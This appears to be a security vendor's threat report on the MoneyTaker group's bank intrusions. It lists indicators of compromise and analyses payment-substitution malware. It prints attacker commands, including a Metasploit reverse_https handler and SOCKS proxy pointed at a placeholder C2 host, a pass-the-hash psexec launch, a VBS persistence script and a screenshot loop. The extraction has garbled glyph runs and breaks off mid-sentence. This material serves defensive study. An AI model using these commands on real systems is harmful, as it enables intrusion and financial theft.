\n\nkeystrokes \nPrivilege escalation tools, whose code \n\nwere demonstrated as a Proof of Concept \n\nat ZeroNights cybersecurity conference in \n\nMoscow in 2016. More data provided later in \n\nthis report\nMoneytaker \u201aAuto-replacement\u2122 \n\nprogram to substitute payment details \n\nin the interbank transfer system\nCitadel and Kronos Banking Trojans. The \n\nlatter one was used to deliver a Point-of-Sale \n\n(POS) malware dubbed ScanPOS\n 5\nGroup 1 \n Group 2\nGroup 3\n17 incidents in US and UK \norganizations. In the majority \n\nof instances, hackers used the \n\nsame C&C server to control the \n\ninitial part of their attacks. In \n\nsome cases, we saw a similar \n\nuse of the infrastructure from \n\nwhich remote connections were \n\nperformed using LogMeIn.\n2 incidents occurred in Russia \n\nin the autumn of 2016. The two \n\nattacks occurred at the same \n\ntime; in both cases Meterpreter \n\nwas used to attack the same \n\ntarget \u0152 servers of the Russian \n\ninterbank transfer system \n\n(AWS CBR).\n1 incident in Russia in the \n\nautumn of 2017. The attack \n\nwas conducted on the AWS \n\nCBR using Meterpreter.\nCommon features of Groups 1-3\nCommon features of Groups 2 and 3\n\u0141\n \nOriginally targeted AWS CBR in Russia \n\u0141\n \nUsing domains in the .ga zone\n\u0141\n \nSimilar manner of propagation across the network.\n\u0141\n \nThe same hosting service used in the incidents in 2016 and 2017\nCommon features of Groups 1 and 2 \nIn both groups of incidents, UltraVNC 1.1.9.4 was used. This version \nwas available back in 2013. The current version of this remote \n\naccess tool was 1.2.0.6 at the time of attacks in Russia and the US.\n\u0141\n \nMetasploit used to infiltrate corporate networks\n\u0141\n \nSSL certificates generated using popular brands to protect traffic between Meterpreter and C&C\n\u0141\n \nRussian-speaking attackers\n\u0141\n \nOwn developers who create unique tools\n\u0141\n \nModification of the malicious code during attack\n\u0141\n \nCovering tracks of the initial infection vector \n\u0141\n \nSetting up forwarding corporate emails to Yandex and Mail.ru, free mail services.\nInterrelations between incidents\nIn 1.5 years, Group-IB confirmed 20 incidents in total. Initially \n\nwe divided these incidents into three groups and considered \n\nthem as separate. However, through in-depth investigation of \n\nthe infrastructure, tools, and tactics applied, which will be further \n\ncovered in this report, we have concluded that one group is \n\nbehind all these attacks \u0152 MoneyTaker. This is supported by \n\ntechnical analysis provided later in this report:\n 6\nTimeline of initial infections in attacks: \n\u0141\n \nThe very first attack, which Group-IB attributes to MoneyTaker \nwas conducted in the spring of 2016, when funds were stolen \n\nfrom a US bank by gaining access to First Data\u2122s STAR card \n\nprocessing system. \n\u0141\n \nIn September 2016, Group-IB tracked several attacks on banks \n\nin Russia. The main target was the AWS CBR (Automated Work \n\nStation Client of the Russian Central Bank), a Russian interbank \n\nfund transfer system similar to SWIFT. After a successful theft \n\nfrom one of the attacked banks, the incidents stopped, similar \n\nto the case of theft in the United States.\n\u0141\n \nIn November 2016, attackers deployed new infrastructure, \n\nwhich was then used to attack banks in the United States. The \n\nlast activity in this wave of attacks was tracked in June 2017.\n\u0141\n \nIn November 2017, we observed a new successful attack by \n\nthis group in Russia. Like in 2016, they managed to steal funds \nthrough the interbank transfers system.\n\u02dc\u02da\u02db\u02dd\n\u02d9\u02c6\u02c7\u02d8\n\n\u02c6\n\u02d9\u02c6\u02c7\u02d8\n\u02c7\u02c6\u02c7\u02c6\n\n\u02d9\u02c7\u2020\n\u2018\u02c6\n\n\u0161\u20ac\n\u02d9\u02c6\u02c7\u02d8\n\u02d9\n\u02dc\u02da\u02db\u02dd\u02da\u02d9\u02c6\n\u02d9\u02c6\u02c7\u02d8\n\u02d9\u02c6\u02c7\u02d8\u2026\n\u2022\u02c7\u02c7\n\u02d9\u02c6\u02c7\u02d8\n\u02d9\u02c6\u02c7\u02d8\u2013\n\u02dc\u02da\u02db\u02dd\u02da\u02d9\u02c6\n\u0192\u02c6\u2020\u2022\n\u02d9\u02c6\u02c7\u02d8\n\n\u02d9\n\u02d9\u02c6\u02c7\u02d8\u2013\n\u02d9\u02c6\u02c7\u02d8\n\u02dc\u02da\u02db\u2039\n\u02d9\u02c6\u02c7\u02d8\u20ac\n\u02d9\u02c6\u02c7\u02d8\u0192\n\u02d9\u02c6\u02c7\u02d8\n\u02d9\u02c6\u02c7\u02d8\u0192\n\u02d9\u02c6\u02c7\u02d8\n\n\u02d9\u02c6\u02c7\u02d8\u203a\n\u02d9\u02c6\u02c7\u02d8\u0192\n 7\nTo conduct targeted attacks, hackers use a distributed \ninfrastructure that is difficult to track. \nA rather unique feature of the infrastructure is the presence of a \nPersistence server, which delivers the payload only to real victims \nwhose IP addresses are added to the whitelist.\nPentest framework server \nThis server is used to perform the main activity. On it, hackers \n\ninstall a legitimate tool for penetration testing - Metasploit to \n\nfurther control the full attack.\nATTACK \nINFRASTRUCTURE\n02\n\u2020\n\u201c\n\u2018\n 8\nName\nSHA256\nType\nasys.exe\n6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2\nMeterpreter\nlaunch-paranoid-\nstageless3.exe\nf98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef\nMeterpreter\nmsc.exe, msc3.exe\n0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff\nMeterpreter\nmsc4.exe\n53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f\nMeterpreter\nmsc5.exe\n98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205\nMeterpreter\nmsc6.exe\n92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607\nMeterpreter\nmsc7.exe\n73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6\nMeterpreter\ncmd.exe\n7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f\nMeterpreter stager\nmencstager.exe\n7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f\nMeterpreter stager\nmsdefender.bat\n8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6\nMeterpreter stager\nse.vbs\nff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc\nMeterpreter stager\nrc4.dll\n8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f\nMeterpreter stager\nrc4.exe\na7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4\nMeterpreter stager\nrc4.hta\n72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52\nMeterpreter stager\nproxystager.bat\n3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774\nMeterpreter stager\nps.bat\n9e9149ae6092c4a5bd4cb36cf40ec660e3ee10e76834340bf1234186315ca808\nMeterpreter stager\nWhen the payload (Meterpreter) runs on a compromised host, it \ninitiates outbound SSL connections which helps to avoid detection \n\nof suspicious connections by network security systems. Below is \n\ncode executed within the Metasploit console by the attacker:\nuse exploit/multi/handler\n \nset PAYLOAD windows/meterpreter/reverse_https\n \n\nset LHOST _c2serverIP_\n \n\nset LPORT 443\n \n\nset HandlerSSLCert /root/.msf4/loot/20161031010327_\n\ndefault_46.228.47.114_www.yahoo.com_pe_399345.pem\n \nset StagerVerifySSLCert true\n \n\nset EnableStageEncoding true\n \nset StageEncoder x86/shikata_ga_nai\n \nset ExitOnSession false\nBy default, Metasploit generates self-signed SSL certificates and \n\nspecifies random values in the following fields: Valid from, Valid \n\ntill, Common name. Such certificates can also cause suspicion.\n 9\nIn order to avoid detection, the MoneyTaker group generates self-\nsigned SSL certificates before the attack, indicating the names of \n\npopular brands in the fields, instead of filling them out randomly. \nGroup-IB specialists have discovered the use of the following \ncertificates:\nPersistence server\nHackers try to stay as inconspicuous as possible, and therefore \n\nthey use \u201afileless\u2122 malware which only exists in RAM and is \n\ndestroyed after reboot.\nThat said, PowerShell and VBS scripts help them to ensure \npersistence in the system.\nScripts provide the following benefits for attackers:\n\n\u0141\n \nMalicious scripts are hard to detect by means of antivirus \nprotection. Writing a signature for a script without false \npositives is much more difficult than a binary file.\n\u0141\n \nScripts are easy to modify, which makes it easier for attackers \nto work.\n\u0141\n \nIt is easy to ensure persistence. Typically, such scripts are \nstored in the registry or are called when certain events occur \nthrough Windows Management Instrumentation (WMI), Group \n\nPolicy Objects (GPOs), Scheduled task. Such scripts are very \nsimple and usually their main task is to download the main \nprogram from an external or local source and run it.\nIssuer\nSSL fingerprint\nIP, where SSL was used\nMetaBank LTD\n8b7fa4ef88a303bb47240c9b8012c80507074f2e\n83.220.172.71\nYahoo Inc.\nc29d79df9b5416fd416c31e57cd525dfc23a8f66\n37.46.133.190\n172.86.121.11\nFiserv Inc\nb3dd855fc1b32757bde5c9f737808f150d6f57e6\n146.185.243.19\nMicrosoft Ltd\n98cbe44e1a30448a3ff6be38e8b277ae189f9b45\n82.146.54.5\nFederal Reserve Bank\n5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a\n188.120.235.201\nBank of America\n5922a06f03f6464921462c07842afb18da1577e9\n188.120.230.218\n188.120.230.235\nVMware\n7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67\n185.141.25.222\n 10\nThe Persistence server is used to force a malicious file to \nbe launched if the attacked computer has been rebooted. A \n\ndistinctive feature of this group is the use of a separate server for \n\nthis goal. \nOn the server, they run a script that performs two checks:\n1.\n \nChecks if the User-agent field is equal to WinHttp. If it is not \nequal, requests are sent back to the web server with a 404 \n\nerror code (page not found). If equal to WinHttp, it performs \n\nthe second check.\n2.\n \nChecks if the IP address from which the request is made is on \n\nthe white list. If yes, then the malicious file mencstager.exe is \n\ndelivered. If not, rundll32.exe is transferred. 51138beea3e2c21e\n\nc44d0932c71762a8 \u0152 a legitimate Windows file.\nThis verification complicates investigative activity of researchers \n\nwho cannot get the malicious file because they try to download it \n\nfrom an IP address that is not on the white list.\n 11\nUnlike other groups conducting targeted attacks, MoneyTaker \nuses standard techniques to provide malware survivability in the \n\nsystem.\nResearchers have not managed to recover the full picture of the \nincidents that occurred in the autumn of 2016 in Russia, because \ntracks of successful attacks were carefully removed. However, \nGroup-IB has discovered that hackers infiltrated the network \n\nof a Russian bank by gaining access to the home computer of \n\nthe bank\u2122s system administrator. One of the methods to ensure \n\nmalware survivability in the system was the creation of services \n\nusing .bat scripts that launched the VNC server.\nThe contents of the at1.bat file:\n\u00abc:\\Program Files\\Cisco Systems\\VPN Client\\hostsec32.exe\u00bb \n-install \u00abHost Security Server\u00bb \nThe contents of the at2.bat file:\n\u00abc:\\Program Files\\Cisco Systems\\VPN Client\\hostsec32.exe\u00bb \n\n-uninstall \u00abhost security server\u00bb \nThese batch files were called from Windows Task Scheduler.\nIn US incidents, the attacker used VBS scripts that created a link \nnamed \u00abTask Scheduler\u00bb for a specific user in the startup to launch \nthe malicious file.\nSet oWS = WScript.CreateObject(\u00abWScript.Shell\u00bb)\n \nsLinkFile = \u00abC:\\Users\\<%username%>\\AppData\\Roaming\\Microsoft\\\nWindows\\Start Menu\\Programs\\Startup\\taskhost.lnk\u00bb\n \nSet oLink = oWS.CreateShortcut(sLinkFile)\n \n\n   oLink.TargetPath = \u00abC:\\Users\\<%username%>\\AppData\\Local\\  \n \n   Temp\\taskhost.exe\u00bb\n \n\u201a  oLink.Arguments = \u00ab\u00bb\n \n\n\u201a  oLink.Description = \u00abTask Scheduler\u00bb   \n \n\n\u201a  oLink.HotKey = \u00abALT+CTRL+F\u00bb\n \n\n\u201a  oLink.IconLocation = \u00abC:\\Users\\<%username%>\\AppData\\Local\\   \n \n   Temp\\taskhost.exe, 2\u00bb\n \n\u201a  oLink.WindowStyle = \u00ab1\u00bb   \n \n\n\u201a  oLink.WorkingDirectory = \u00abC:\\Users\\<%username%>\\AppData\\\n \n\n   Local\\Temp\u00bb\n \noLink.Save \nPROVISION OF THE MALWARE \nSURVIVABILITY\n03\n 12\nAfter successfully infecting one of the computers and gaining \ninitial access to the system, the attacker performs reconnaissance \n\nof the local network in order to gain domain administrator \n\nprivileges and eventually consolidate control over the network.\nHackers use the Metasploit tool to conduct network \nreconnaissance, search for vulnerable applications, exploit \nvulnerabilities, escalate systems privileges, and collect \n\ninformation.\nGaining admin privileges\nTo escalate privileges up to the local administrator (or \ufb01SYSTEM\ufb02 \n\nlocal user), attackers use exploit modules from the standard \n\nMetasploit pack, or exploits designed to bypass the UAC \n\ntechnology. With local administrator privileges they can use \n\nthe Mimikatz program, which is loaded into the memory using \n\nMeterpreter, to extract unencrypted Windows credentials.\nIn addition to the standard modules from the Metasploit pack, the \nfollowing tools are used to escalate privileges:\nIt is interesting to analyze the ASLRSideChannelAttack.exe file. It \nwas compiled on October 23, 2016 based on codes presented at \n\nthe Russian conference ZeroNights 2016. The codes are available \n\nonline at https://github.com/IOActive/I-know-where-your-page-\n\nlives. \nPROPAGATION ACROSS \n \nTHE NETWORK\n04\nName\nMD5\nType\nASLRSideChannelAttack.exe\n9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5d33cf8bff4\nLPE Win10x64\ncve.bat\n7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc9fa734a\nBAT LPE executor\ncve.exe\n98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3646b6c8cb6\ncve-2016-7255\ncve-2016-7255.exe\n5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3345da14a6b5\ncve-2016-7255\ncve-2016-7255test.exe\ndf69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec4856f4bee\ncve-2016-7255\n 13\nIn addition, they actively searched for passwords stored in Active \nDirectory group policies by exploiting the MS14-025 vulnerability \n\nand the corresponding Metasploit module (post/windows/gather/\n\ncredentials/gpp). \nAfter receiving group policy files, the attacker decrypted the \npasswords that were stored there and used them on other \nworkstations. In some cases, passwords of bank systems\u2122 \n\naccounts granting local administrator privileges were very weak. \nHere is an example of domain administrator passwords that \nattackers recovered:\nUsing the Metasploit modules with the functionality of dumping \nWindows local users\u2122 password hashes stored in the Security \n\nAccounts Manager (hashdump or smart_hashdump modules), \n\nhackers received the local administrator\u2122s NTLM hash, as well as \n\nthe NTLM hash and unencrypted password for domain users.\nPropagation across the network\nTo get the list of computers in Active Directory, hackers often use \n\na PowerShell script named allpc.ps1, which was copied from this \n\ndiscussion in October 2015:\nhttps://serverfault.com/questions/732681/export-simple-list-of-all-\ncomputers-in-multiple-ous-in-ad \nTo propagate across the network, hackers used a legitimate tool \npsexec, which is typical for network administrators. This tool \n\ncreates a local service via SMB/RPC protocol, then executes and \n\ndeletes it. In the service properties, the required command is set \n\nto start. The attacker used two methods to distribute the payload: \n\nthey placed executable files in the network folder, and forced \n\nthe attacked computers to start them, or indicated the shell code \n\ndirectly in the service start line.\nFor passwords that were received as an NTLM hash and were not \ndecrypted, the Pass-the-hash technique was used, which allows \nusing an NTLM hash for authentication without password. To do \nthis, the same legitimate Metasploit\u2122s psexec modules were used \n\nwithout any modification.\n \nUser name\nEncrypted value of the password field\nDecrypted password\nAdministrator\nUj80N3lMoEtnIXIP+dTzzBK/2/mALyumPkQaj9249KY\nWrongpassword1\nAdministrator\nn8rOHPvtmB1j24AV7EYclWS6DgQWaoQkfqzOZVlBLzI\nSystem321\n 14\n \nuse auxiliary/admin/smb/psexec_command\n \nset COMMAND start \\\\\\\\10.1.5.35\\\\tmp\\\\msc7.exe\n \nset RHOSTS 10.1.5.35\n \nset SMBUser Administrator\n \n\nset SMBPass aad3b435b51404eeaad3b435b51404ee:23cec95759ea5880\n\nadf1794f475c23cd\n \nset SMBDomain WORKGROUP\nAfter gaining access to new systems, attackers repeated the \n\nabove-mentioned procedure to collect passwords.  \nRemote access\nUntil October 2017, hackers remotely accessed systems of interest \n\nusing standard Metasploit tools, as well as legitimate remote \n\naccess programs.\nOn hosts where Meterpreter was launched, hackers set up a \nSOCKS proxy server, which allowed them to remotely send \n\ncommands within the local network. To create a connection via \n\nSOCKS proxy, they primarily used ports 7080 and 1808:\nuse auxiliary/server/socks4a\n \n\nshow options\n \nset SRVHOST _c2serverIP_\n \n\nset SRVPORT 7080\nIn addition, they actively used various VNC clients such as Fileless \n\nVNC, VNC, UltraVNC and TightVNC Portable versions x32 and \n\nx64.\nIn the US, they used the LogMeIn Hamachi solution for remote \naccess.\nIn one incident, to ensure continuous remote access, hackers \ngained access to the firewall, where they configured a tunnel to \n\nthe C&C server.\nAlso, to secure connections to its C&C server, hackers established \nan SSH tunnel using a legitimate tool - Plink.\n 15\nTo conduct a successful attack, hackers need to monitor legitimate \nactivity of the victim bank\u2122s users and financial operators to then \n\nrepeat the same actions.\nThe MoneyTaker group uses the following tools to spy on \nemployees:\n\u0141\n \nA legitimate tool NirCmd\n\u0141\n \nSelf-developed tools - \u201ascreenshotter\u2122 and \u201akeylogger\u2122\nNirCmd is a small command-line utility, with the functionality \nsimilar to psexec. It allows hackers to remotely execute various \n\ncommands: write and delete values and keys in the Registry, write \n\nvalues into INI file, connect to a VPN network, restart windows or \n\nshut down the computer, change the created/modified date of a \n\nfile, change display settings, turn off the monitor, and many more.\nOne of the most important capabilities for attackers is taking \nscreenshots. For example, by running the following command:\nnircmd.exe loop 10 60000 savescreenshot c:\\temp\\\nscr~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png\n10 screenshots will be taken with an interval of 60 seconds.\nHowever, this functionality was not enough for the group, \ntherefore they created their own unique tools designed to take \n\nscreenshots and capture keystrokes.\nSPYING ON \nLEGITIMATE USERS\n05\nName\nMD5\nType\nperfmon.exe\n2049df4a5f92709bad14a7e2b8c0cfcb6ede2f71009cb3483892108\ne949800e6\nDropper of Keylogger/Screenshotter\nperfmonpe.exe\nff3c84266fdba3638b9fc1a41cab87cf4021eb531954343d1a328b30\n\n7b586ac6\nDropper of Keylogger/Screenshotter\nrecycler.exe\n206aec8132cbb2497553b1f2c1c40733188929bad2feb0640e99474\n\nb327e564b\nDropper of Keylogger/Screenshotter\nxkey.exe\nb2e02579cf0e9c2a57bff806b57d6b868d5d411264d38ff7ac7e6b4\n\n7d0d2a33d\nKeylogger/Screenshotter\nxkey_x86.dll\n60e6652ae39ecd9314ba0e7936b41ca813737183c4eaa96dce0b4a\n\n36a90375dd\nKeylogger/Screenshotter\n 16\nThese programs are designed to capture keystrokes, take \nscreenshots of the user\u2122s desktop and get the contents from the \n\nclipboard. All this data can be stored in a file of the temporary \n\ndirectory.\nDropper\nThis is an NSIS-packed downloader. Upon its launch it creates the \n\nfollowing files:\n%Temp%\\datepicker-ru_RU.js\n \n%Temp%\\LEJ%2BPamplona%2BSanta.jpg\n \n\n \n%Temp%\\fonts.css\n \n%Temp%\\addons.css\n \n%Temp%\\tracker.php\n \n%Temp%\\mJ8OS5lCf8xFQQiX4F1Ei.sNXbnF1xay\n \n%Temp%\\<rnd_chars>.tmp\\System.dll\nThe dropper twice launches its own file as a child process.\nIt decrypts the data buffer, which is stored in the dropper in an \nencrypted form, and injects it into the child process (which is \n\nlaunched last). That is how the payload is started.\nKeylogger/Screenshotter\n\u0141\n \nThe application is compiled in Delphi. Its main form contains \n\ntext field components and 5 timers.\n\u0141\n \nBased on the names of components in Portuguese, we assume \n\nthat either its author is Portuguese-speaking, or the campaign \n\ntargets Portuguese-speaking countries (for example, Brazil) \nor the code is based on the source code of the Portuguese \nprogram.\n\u0141\n \nFunctions of the application are executed once the timer \ntriggers (after the time interval, which is specified in this timer \n\nas the interval of the timer operation).\n 17\n\u0141\n \nTimers\u2122 names mean that one of them is used to activate \nnetwork functions (InternetTimer), another one is used to send \n\ndata (EnviarTimer). However, in fact they perform other activity. \n\nInstead of activating the network functions, the \u00abInternetTimer\u00bb \n\ntimer simply activates another timer, and the \u00abEnviarTimer\u00bb \n\ntimer (translated as \u00absending timer\u00bb) captures screenshots and \n\nuploads the collected data to a file in a temporary directory. \n\nThis may indicate that the source code of the file, which was \n\noriginally written for other purposes (including sending network \n\ndata), was then slightly modified.\n\u0141\n \nAfter the start, the application executes the TForm1.\nFormCreate() procedure, where it loads the necessary system \ndynamic libraries into the address space and looks for the \n\naddresses of the functions WinExec, GetAsyncKeyState, \n\nGetWindowTextA, GetForegroundWindow KeyloggerTimer in \nthem. When the timer triggers, it intercepts keystrokes. It also \nextracts the name of the application (the window title) in which \nthe key was pressed and the date / time of pressing.\n \n\nBelow is an example of a record of the keylogger log. Bold \n\nmarked are pressed keys or dialog box titles in which these keys \nwere entered\n[F2][F9]</textarea><br><br><b><font color = \u00abgreen\u00bb>[ Run \n\n- 2:53:54 - 11.11.2017 ] <br></b></font><style>textarea \n{width:100%; height:7em;}</style><textarea readonly>some_\nentered_word</textarea><br><br><b><font color = \n\n\u00abgreen\u00bb>[ OllyDbg - 1.exe - [CPU - main thread, module \n\n1] - 2:54:25 - 11.11.2017 ] <br></b></font><style>textarea \n{width:100%; height:7em;}</style><textarea readonly>\nTimer name\nFunction\nStatus at the time \nof launch \nTimer's triggering \n\ninterval\nActivity of the triggered timer \nInternetTimer\nTimer activating  \n\nAtivatTimer\nenabled\n10 seconds\nTriggers the activation timer\nKeyloggerTimer\nKeylogger timer\ndisabled\n1 millisecond\nActivates the functions of the keylogger. Described \n\nin detail below.\nEnviarTimer\nData export timer \ndisabled\n5 minutes\nTakes screenshots, dumps all the collected data into \n\na file. Will be described below\nAtivatTimer\nActivation timer\ndisabled\n1 millisecond\nTriggers the keylogger timer and the data export \ntimer; disables the activation timer (itself)\nDesativatTimer\nDeactivation timer \ndisabled\n1 millisecond\nTriggers the keylogger timer, and the data export \n\ntimer; disables the deactivation timer (itself)\n 18\n\u0141\n \nThe keylogger records the results of the interception to the \nTForm1.Memo1 object located on the application\u2122s main form. \n\nFrom here data can be obtained for further recording to a file \n\nin a temporary directory.\n\u0141\n \nEnviaTimer. Using the API function GetClipboardData () it can \nintercept the contents of the clipboard\n\u0141\n \nThe anti-emulation function is implemented in the timer \ncode to bypass antivirus and automated sample analysis \n\nby calling the ValidateName () function. Purportedly, this \n\nmethod of anti-emulation was copied from a public Russian \n\nspeaking source (the forum https://fuckav.ru/showpost.\n\nphp?p=109096&postcount=63) and was implemented with an \n\nerror, due to which the functions of taking screenshots and \n\nwriting data to a file (which is located in code after checking \n\nfor emulation) may not be executed.\n\u0141\n \nIt takes a screenshot of the desktop, compresses it into JPEG \n\nand encodes in base64\n\u0141\n \nIt creates a file with the name \ufb01%Temp%\\perflog1.tmp\ufb02\n\u0141\n \nNetwork communications used to send collected data have \n\nnot been detected in the analyzed file.\nExample of the contents of the \ufb01%Temp%\\\n\nperflog1.tmp\ufb02 file collected by keylogger \n\nand screenshotter \n 19\nIn August 2016 hackers successfully infiltrated the network of a \nRussian bank.  They used an automated system to steal money \n\nthrough the AWS CBR (Automated Work Station Client of the \n\nRussian Central Bank), an interbank fund transfer system. \nATTACK ON \nAWS CBR\n06\nName\nMD5\nType\nmain.exe\nigfxserv.exe\nD57608F6DB9045752165EAF93452D57F\nMain module\nxml.exe\nA70F905266F3D57B73B1D8A265286FD5\nModule used to substitute payment messages\ned.exe\n92B03E123B2D97B8E8E274224273EC5E\nModule used to hide fraudulent transfers \ntxt.exe\nModule used to work with temporary files \narsm32.exe\nA70F905266F3D57B73B1D8A265286FD5\nUltraVNC\nhostsec64.exe\n92B03E123B2D97B8E8E274224273EC5E\nVNC client\nhostsec32.exe\nVNC client\nempty32.exe\nA70F905266F3D57B73B1D8A265286FD5\nVNC client\ntest64.exe\n1E4499560CDD2F69ECBED8761CAC7272\n\n8B1B5D1C8430EC16735E5DED94112B18\nMeterpreter \n\nhttps://185.86.149.140/Y0DNA:443\ntest32.exe  \n09A7F9813F6DE28F2D7BCBA032390662\nMeterpreter\nbtcp32.exe\nMeterpreter\nload64.exe\nMeterpreter\nplink.exe\nB5450C8553DEF4996426AB46996B2E55\n185.86.149.140\nFar.exe  \n4.bat  \nnbt.EXE\n\nhkcmd.exe\n4672E624C5210A523AA0A0B56DB677B6\nKeylogger stores logs in snmp.dat\nat1.bat\nstartdll32.exe\nqpd.exe\n 20\nHaving accessed the bank\u2122s internal network, hackers \ndownloaded a modular tool called Moneytaker v5.0 to the server \n\nof the AWS CBR. This is the tool which the group has been named \n\nafter.   \nIts main module is located in the directory \ufb01c:\\intel\\logs\\1\\mt\\bin\ufb02 \nand has the name \ufb01main.exe\ufb02 or \ufb01igfxserv.exe\ufb02. This is a program \nwithout network communications and it should run with the \n\nmain configuration file specified as an argument. It is initialized \naccording to the configuration file, then it checks the presence \nof the modules specified in the configuration file and backups of \ncertain AWS CBR directories.\nFurther through the report, in the behavior description which \ndepends on the configuration file, the name of the argument will \n\nbe specified.\nMAIN MODULE \u0152 \ufb01MAIN.EXE\ufb02 OR \n \n\ufb01IGFXSERV.EXE\ufb02\nThe main module is started by passing the main configuration \n\nfile \ufb01c:\\intel\\logs\\1\\mt\\config\\main-config.txt\ufb02 as an argument. The \n\nmodule logs all events to the \ufb01Main-Logfile\ufb02 file. Upon startup, \n\nthe module looks for XML, ED and TXT modules specified in the \n\nconfig file as \ufb01XmlBin\ufb02 \ufb01EdBin\ufb02 and \ufb01TxtBin\ufb02, respectively. They \n\nalso search for their configuration files, the parameters: \ufb01XmlCfg\ufb02 \n\n\ufb01EdCfg\ufb02 and \ufb01TxtCfg\ufb02. If configuration files of modules do not exist \n\nas separate files, their settings are stored together in the \ufb01main-\n\nconfig.txt\ufb02 file.\nThe module reads the \ufb01Directory\ufb02 \ufb01Backup\ufb02 \ufb01Recursive\ufb02 \n\ufb01Action\ufb02 parameters and uses the WINAPI function called \nReadDirectoryChangesW() to monitor the files appearing in the \ndirectories specified in the \ufb01Directory\ufb02.\nWhen a new file appears, the corresponding module is started (ED \nfor the \ufb01chk\ufb02 directory, XML for the \ufb01cli\ufb02 directory and TXT for the \n\n\ufb01tmp\ufb02 directory) and copied to the directory specified as \ufb01Backup\ufb02.\nDirectory name\nDesignation in AWS CBR\n%\u02dc\u02da\u02db \u02dd\u02d9\u02da%\\exg\\chk\nDecrypted, unpacked and verified electronic messages \n%\u02dc\u02da\u02db \u02dd\u02d9\u02da%\\exq\\cli\nReceived messages from AWS CBR formed according to the \n\nunified formats of electronic messages of the Central Bank \n\nof Russia\n%\u02dc\u02da\u02db \u02dd\u02d9\u02da%\\tmp\nTemporary files\n 21\n\u02c6\u02c7\u02db\n\n\nAUTOMATED REPLACEMENT MODULE \u0152 \n \n\ufb01XML.EXE\ufb02\nThe main module starts the \ufb01xml.exe\ufb02 file, passing the name of a \nnew file in the \ufb01%\u02dc\u02da\u02db \u02dd\u02d9\u02da%\\exq\\cli\ufb02 directory and the config file.\nThe automated replacement module records detailed logs and \nwrites them to a file specified in the configuration as \ufb01Xml-Logfile\ufb02\nElectronic messages generated by the AWS CBR are placed in \nthe \ufb01%\u02dc\u02da\u02db \u02dd\u02d9\u02da%\\exq\\cli\ufb02 directory for further processing by \n\nthe gateway component \ufb01Input control\ufb02. It is at this point that the \n\nmodule checks the xml file for validity and determines whether the \n\nelectronic message file is a payment order (the \ufb01ED101\ufb02 type).\n 22\nFor ED101, the module scans for the fields \ufb01Purpose\ufb02, \ufb01Payer\ufb02, \n\ufb01PersonalAcc\ufb02, \ufb01Payee\ufb02, \ufb01Name\ufb02, \ufb01Bank BIC\ufb02, \ufb01CorrespAcc\ufb02, \ufb01KPP\ufb02, \n\n\ufb01INN\ufb02, \ufb01SUM\ufb02, \ufb01AccDocNo\ufb02.\nThen it reads the file with the fraudsters\u2122 payment details - \ufb01Xml-\nWorkfile\ufb02. The following fields are specified: \ufb02name\ufb02, \ufb02id\ufb02, \ufb02acc\ufb02, \n\ufb01inn\ufb02, \ufb01kpp\ufb02, \ufb02bik\ufb02, \ufb02corr\ufb02, \ufb02purpose\ufb02.\nIf it manages to get all the necessary fields from the payment \norder and the \ufb01Xml-Workfile\ufb02 file has required details, then the \n\npayment order will be modified by substituting original payment \n\ndetails with fraudulent ones. That said, the payment amount does \n\nnot change, and for each replaced document the attackers have a \n\nseparate account. The accounts for which the money goes are not \n\nrepeated.\nThe success of replacement is due to the fact that at this stage \nthe payment order has not yet been signed, which will occur after \npayment details are replaced.\nFor further operation of another module - ED, after each \nautomated replacement the XML module stores information in the \n\n\ufb01Xml-Resultfile\ufb02 file in the following format:\n#\n \n\nId=\n \nOrigAcc=\n \nOrigBic=\n \nOrigCor=\n \nPurpose=\n \nHackAcc=\n \nHackBic=\n \nHackCor=\n \nSum=\n \nPayerPersonalAcc=\n \n#\n \nCONCEALMENT MODULE \u0152 ED.EXE\nThe \ufb01ed.exe\ufb02 file is started by the main module passing the name \n\nof a new file in the \ufb01%\u02dc\u02da\u02db \u02dd\u02d9\u02da%\\exq\\chk\ufb02 directory and the \n\nconfiguration file.\n\u0141\n \nAfter the payment order is modified, signed and sent, the \nfollowing activity is performed:\n\u0141\n \nIt is transferred to the logical control where the correctness \n\nof the electronic payment message is checked, and the \n\ncompliance of the payment details with reference data is \n\nestablished\n\u0141\n \nThe program checks the possibility of payment within the \namount of liquid funds in the bank account\n 23\n\u0141\n \nThe electronic payment message is accepted for execution; \nthe funds are debited from the payer\u2122s account and credited \n\nto the beneficiary\u2122s account\n\u0141\n \nBased on the results of execution, an electronic message \n\nED206 (confirmation of debit) is sent to the address of the \nissuer.\n\u0141\n \nThe message is decrypted, unpacked, passes the verification \nof the authentication code and security code and is stored in \n\nthe \ufb01%APM KBR%\\exq\\chk\ufb02 directory\n\u0141\n \nThe main module starts the concealment module passing the \n\nincoming electronic message.\nThe ED module checks whether the incoming electronic \n\nmessage is ED206 (debit/credit confirmation following the results \n\nof debit transaction) or ED211 (following the results of the day or \n\npayment batch).\nFor ED206, the field \ufb01CorrAcc\ufb02 is verified, for ED211 the 